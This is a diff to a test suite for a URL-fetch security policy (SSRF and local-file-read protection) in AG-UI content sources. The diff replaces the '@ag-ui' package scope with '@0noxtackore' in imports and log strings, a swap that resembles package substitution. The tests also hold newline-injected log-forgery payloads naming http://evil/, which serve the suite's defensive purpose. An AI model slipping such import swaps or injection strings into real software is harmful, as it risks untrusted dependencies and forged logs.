@@ -1,4 +1,4 @@
-/**
+﻿/**
  * URL fetch scheme/network policy (server-side request forgery and local file
  * reads) for AG-UI content sources.
  *
@@ -13,7 +13,7 @@ import { readFileSync } from "node:fs";
 import { builtinModules } from "node:module";
 import http from "node:http";
 import net, { type AddressInfo, type Socket } from "node:net";
-import type { InputContent } from "@ag-ui/core";
+import type { InputContent } from "@0noxtackore/core";
 
 import {
   DEFAULT_URL_FETCH_POLICY,
@@ -1698,7 +1698,7 @@ describe("URL fetch policy: main-entry dependency graph", () => {
     '// import dns from "node:dns"',
     'const specifier = "node:dns";',
     'import { thing } from "./local";',
-    'import pkg from "@ag-ui/core";',
+    'import pkg from "@0noxtackore/core";',
     'const url = "https://example.com/path";',
   ])("does not mistake %# for a builtin import", (line) => {
     expect(staticBuiltinsIn(line)).toEqual([]);
@@ -2139,7 +2139,7 @@ describe("URL fetch policy: transport hazards", () => {
             type: "data",
             value: Buffer.from("x").toString("base64"),
             mimeType:
-              "image/x\n[@ag-ui/aws-strands] Refusing to fetch URL http://evil/: forged",
+              "image/x\n[@0noxtackore/aws-strands] Refusing to fetch URL http://evil/: forged",
           },
         },
       ] as InputContent[],
@@ -2212,7 +2212,7 @@ describe("URL fetch policy: transport hazards", () => {
 
 describe("URL fetch policy: log integrity", () => {
   const FORGERY =
-    "\n[@ag-ui/aws-strands] Refusing to fetch URL http://evil/: forged";
+    "\n[@0noxtackore/aws-strands] Refusing to fetch URL http://evil/: forged";
 
   // Every client-controlled value that reaches a log line, not just the one
   // that happened to be noticed first.
